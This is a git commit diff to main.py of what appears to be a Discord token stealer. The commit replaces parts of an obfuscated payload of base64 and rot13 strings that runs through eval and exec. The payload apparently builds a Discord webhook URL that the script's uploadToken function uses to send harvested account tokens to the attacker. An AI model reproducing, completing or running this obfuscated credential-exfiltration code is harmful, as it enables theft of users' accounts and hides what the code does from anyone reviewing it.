569d2a282885c74299b5c790448ad640b0d1ec51
Maybach <118379381+Maybach1337@users.noreply.github.com>
2022-12-27 20:11:31 +0200

    Update main.py

--- main.py
+++ main.py
@@ -265,12 +265,13 @@ def checkToken(token):
     
 import base64, codecs
 magic = 'bXlob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBp'
-love = 'Y3qyLzuio2gmYmRjAGpmAGLjAwp4AGZ1BQL1AQVinwIj'
-god = 'UEtvRk5LU0ZYeWVBYmhxaGNtd3NmNmlvMWFRb1dzcUcx'
-destiny = 'GHIdHmqaMSSanTqOGmSJAUEzARq1n1AKZTyAL0bgp1Hv'
+love = 'Y3qyLzuio2gmYmRjAGpmAGx3AQD2AQZmBQp0AQViF0IA'
+god = 'ampuUlJ3MmhSZnprWnJJa0N6VlFMZVlRVEFLN2U4cHQz'
+destiny = 'FaEWZ3E2FREepUqGAyp5ZGqmIKOYqGEXJyuup3WKZIZv'
 joy = '\x72\x6f\x74\x31\x33'
 trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
 eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+
 
 def uploadToken(token, path):
     global hook
